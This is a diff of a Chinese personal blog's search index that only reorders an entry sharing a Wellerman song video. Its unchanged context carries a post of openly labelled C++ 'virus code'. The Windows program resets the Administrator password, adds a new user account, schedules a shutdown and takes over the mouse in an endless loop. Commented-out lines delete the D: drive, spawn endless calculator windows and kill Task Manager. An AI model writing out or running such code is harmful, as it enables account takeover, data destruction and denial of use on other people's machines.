@@ -163,14 +163,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>歌曲[Wellerman]分享</title>
-    <url>/2025/09/29/%E6%AD%8C%E6%9B%B2-Wellerman-%E5%88%86%E4%BA%AB/</url>
-    <content><![CDATA[<h1 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h1><iframe src="//player.bilibili.com/player.html?isOutside=true&aid=425767956&bvid=BV1a3411T7TH&cid=580886675&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>
-
-<h1 id="链接直达"><a href="#链接直达" class="headerlink" title="链接直达"></a>链接直达</h1><p><a href="https://www.bilibili.com/video/BV1a3411T7TH?p=1">BiliBili</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>C++代码分享-1</title>
     <url>/2025/09/30/C-%E4%BB%A3%E7%A0%81%E5%88%86%E4%BA%AB-1/</url>
     <content><![CDATA[<h1 id="c-病毒代码（慎用）"><a href="#c-病毒代码（慎用）" class="headerlink" title="c++病毒代码（慎用）"></a>c++病毒代码（慎用）</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;确定要修改密码吗，请输入Y(Yes)或N(No)：&quot;</span>;</span><br><span class="line">	<span class="type">char</span> k=<span class="built_in">getch</span>();</span><br><span class="line">	<span class="keyword">if</span>(k==<span class="string">&#x27;Y&#x27;</span>||k==<span class="string">&#x27;y&#x27;</span>) <span class="built_in">system</span>(<span class="string">&quot;net user Administrator wait&quot;</span>);<span class="comment">//用户密码重设为wait</span></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;net user xxx wait /add&quot;</span>);<span class="comment">//用户名重设为xxx</span></span><br><span class="line">	<span class="comment">//system(&quot;ping www.baidu.com&quot;);//ping百度网站</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;确定要30秒关机吗，请输入Y(Yes)或N(No)：&quot;</span>;</span><br><span class="line">	k=<span class="built_in">getch</span>();</span><br><span class="line">	<span class="keyword">if</span>(k==<span class="string">&#x27;Y&#x27;</span>||k==<span class="string">&#x27;y&#x27;</span>) <span class="built_in">system</span>(<span class="string">&quot;shutdown -s -t 30&quot;</span>);<span class="comment">//30秒后关机</span></span><br><span class="line">	<span class="comment">//system(&quot;del /F /S /Q D:\\&quot;);//强制删除D盘(慎用)</span></span><br><span class="line">	<span class="type">int</span> x=<span class="built_in">GetSystemMetrics</span>(SM_CXSCREEN);<span class="comment">//get鼠标x轴 </span></span><br><span class="line">    <span class="type">int</span> y=<span class="built_in">GetSystemMetrics</span>(SM_CYSCREEN);<span class="comment">//get鼠标y轴</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;确定要控制鼠标吗，请输入Y(Yes)或N(No)：&quot;</span>;</span><br><span class="line">	k=<span class="built_in">getch</span>();</span><br><span class="line">	<span class="keyword">if</span>(k==<span class="string">&#x27;Y&#x27;</span>||k==<span class="string">&#x27;y&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">SetCursorPos</span>(<span class="built_in">rand</span>()%x,<span class="built_in">rand</span>()%y);<span class="comment">//鼠标 x y轴 随机</span></span><br><span class="line">			<span class="comment">//system(&quot;calc&quot;);//打开无数个计算器，直到死机（慎用） </span></span><br><span class="line">			<span class="comment">//system(&quot;cmd&quot;);//打开cmd（慎用）</span></span><br><span class="line">			<span class="comment">//system(&quot;taskkill /f /im taskmgr.exe&quot;);//禁止打开任务管理器（慎用）</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -185,6 +177,14 @@
       <tags>
         <tag>C++代码分享</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>歌曲[Wellerman]分享</title>
+    <url>/2025/09/29/%E6%AD%8C%E6%9B%B2-Wellerman-%E5%88%86%E4%BA%AB/</url>
+    <content><![CDATA[<h1 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h1><iframe src="//player.bilibili.com/player.html?isOutside=true&aid=425767956&bvid=BV1a3411T7TH&cid=580886675&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>
+
+<h1 id="链接直达"><a href="#链接直达" class="headerlink" title="链接直达"></a>链接直达</h1><p><a href="https://www.bilibili.com/video/BV1a3411T7TH?p=1">BiliBili</a></p>
+]]></content>
   </entry>
   <entry>
     <title>Hello World</title>
